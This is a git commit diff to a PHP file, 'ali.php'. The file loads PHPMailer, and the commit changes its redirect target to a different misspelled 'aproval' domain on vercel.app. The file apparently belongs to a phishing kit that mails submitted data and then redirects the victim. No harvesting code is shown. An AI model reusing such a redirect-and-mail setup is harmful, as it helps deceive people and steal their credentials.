457d707ac0eb2ea3d5f6363c1e37d89b77815645
kameronjustine234 <kameronjustine234@gmail.com>
2025-07-23 14:47:28 +0500

    Update ali.php

--- ali.php
+++ ali.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://pass-aproval.vercel.app/");
+header("Location: https://re-pass-aproval.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
